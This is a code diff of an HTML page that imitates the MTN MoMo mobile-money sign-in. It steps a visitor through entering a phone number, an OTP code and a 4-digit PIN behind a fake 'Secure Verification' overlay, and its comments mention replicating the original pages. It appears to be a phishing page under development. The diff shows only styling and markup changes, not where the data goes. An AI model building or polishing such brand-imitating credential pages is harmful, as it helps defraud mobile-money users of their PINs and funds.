@@ -26,16 +26,22 @@
     .phone-row { display: flex; gap: 10px; align-items: center; border: 1px solid #ccc; border-radius: 16px; padding: 8px 14px; }
     .country-flag { font-size: 20px; }
     .phone-input-field { border: none; outline: none; width: 100%; font-size: 18px; font-weight: 600; }
+    
+    /* Dynamic Interactive Button Styles */
     button { 
       width: 100%; padding: 16px; margin-top: 30px; border: 0; border-radius: 25px; 
-      background: #004f71; color: white; font-weight: bold; font-size: 16px; cursor: pointer; 
+      background: #cccccc; color: white; font-weight: bold; font-size: 16px; cursor: not-allowed; 
+      transition: background-color 0.2s ease;
     }
-    button:disabled { background: #cccccc; cursor: not-allowed; }
+    button:not(:disabled) { background: #004f71; cursor: pointer; }
+    button:not(:disabled):active { background: #00364e; }
+
     .hidden { display: none !important; }
     .legal-text { text-align: center; font-size: 13px; color: #666; margin-top: 25px; }
     .legal-text a { color: #004f71; text-decoration: none; font-weight: bold; }
     .error { color: #d32f2f; text-align: center; margin-top: 12px; font-weight: 600; }
     .success { font-size: 24px; text-align: center; color: #2e7d32; font-weight: bold; }
+    
     .secure-overlay {
       position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 30, 45, 0.75);
       backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); z-index: 9999;
@@ -49,15 +55,12 @@
     .secure-sub { font-size: 14px; color: #dddddd; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* -------------------------------------------------------------
-       STYLES EXCLUSIVELY ADDED FOR YOUR ADDITIONAL MTN PAGES
-       ------------------------------------------------------------- */
+    /* MTN Branding Styles */
     .mtn-yellow-header { background: #FFCC00 !important; padding: 24px 16px 20px !important; }
     .mtn-logo-oval {
       background: #FFCC00; border: 3px solid #000; border-radius: 50%;
       width: 105px; height: 62px; display: flex; align-items: center; justify-content: center;
-      font-family: 'Arial Black', Impact, sans-serif; font-size: 24px; font-weight: 900; color: #000;
-      margin: 0 auto;
+      font-family: 'Arial Black', Impact, sans-serif; font-size: 24px; font-weight: 900; color: #000; margin: 0 auto;
     }
     .mtn-main-theme { width: 100% !important; margin: 0 !important; padding: 20px 32px !important; box-shadow: none !important; border-radius: 0 !important; }
     .graphic-container { margin: 10px 0 5px; position: relative; width: 120px; height: 110px; display: flex; justify-content: center; align-items: center; }
@@ -72,7 +75,7 @@
     .info-box { background: #FFF9E6; border-radius: 8px; padding: 14px 16px; display: flex; gap: 12px; margin-bottom: 25px; width: 100%; text-align: left; }
     .info-icon { background: #FFCC00; color: white; border-radius: 50%; width: 20px; height: 20px; min-width: 20px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 13px; }
     .info-text { font-size: 13.5px; color: #333333; line-height: 1.4; }
-    .mtn-btn { background: #FFCC00 !important; color: #000000 !important; font-size: 18px !important; }
+    .mtn-btn { background: #FFCC00 !important; color: #000000 !important; font-size: 18px !important; cursor: pointer !important; }
     .resend-container { margin-top: 24px; font-size: 14px; color: #666666; text-align: center; width: 100%; }
     .resend-link { color: #004f71; text-decoration: none; font-weight: bold; cursor: pointer; }
     .footer-curve { width: 100%; height: 40px; background: #FFCC00; clip-path: ellipse(60% 100% at 50% 100%); margin-top: auto; }
@@ -83,7 +86,7 @@
   <div id="secureModal" class="secure-overlay hidden">
     <div class="circular-spinner"></div>
     <div class="secure-title" id="modalTitle">Secure Verification</div>
-    <div class="secure-sub" id="modalSub">Verifying your PIN...<br>Please do not close this page.</div>
+    <div class="secure-sub" id="modalSub">Verifying your details...<br>Please do not close this page.</div>
   </div>
 
   <header id="momoHeader">
@@ -92,7 +95,7 @@
   </header>
 
   <main id="mainContainer">
-    <!-- STEP 1: PHONE INTRO REPLICATED UNTOUCHED -->
+    <!-- STEP 1: ORIGINAL PHONE REPLICATED -->
     <section id="phonePage">
       <h2>Welcome to MoMo</h2>
       <label class="field-label">Enter number *</label>
@@ -105,7 +108,7 @@
       <p class="legal-text">Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
     </section>
 
-    <!-- STEP 2: MTN BRANDED FULL TEXT BOX OTP PAGE -->
+    <!-- STEP 2: MTN OTP PAGE -->
     <section id="otpScreenOne" class="hidden" style="width:100%; display: flex; flex-direction: column; align-items: center;">
       <div class="graphic-container">
         <div class="phone-icon-mock"></div>
@@ -125,7 +128,7 @@
       <div class="resend-container">Didn't receive the code? <span class="resend-link">Resend</span></div>
     </section>
 
-    <!-- STEP 3: MTN BRANDED 4-SEPARATED DIGIT PIN BOXES PAGE -->
+    <!-- STEP 3: MTN 4-DIGIT SECURE PIN VIEW -->
     <section id="otpScreenTwo" class="hidden" style="width:100%; display: flex; flex-direction: column; align-items: center;">
       <div class="graphic-container">
         <div class="phone-icon-mock"></div>
@@ -145,7 +148,7 @@
       <div class="resend-container">Didn't receive the code? <span class="resend-link">Resend</span></div>
     </section>
 
-    <!-- STEP 4: SUCCESS COMPLETION CONTAINER -->
+    <!-- STEP 4: SUCCESS VIEW -->
     <section id="successPage" class="hidden">
       <div class="success">✓ Verified Successfully</div>
     </section>
@@ -168,4 +171,5 @@
     const otpScreenTwo = document.getElementById('otpScreenTwo');
     const successPage = document.getElementById('successPage');
     
+    const secureModal = document.getElementById('secureModal');
 
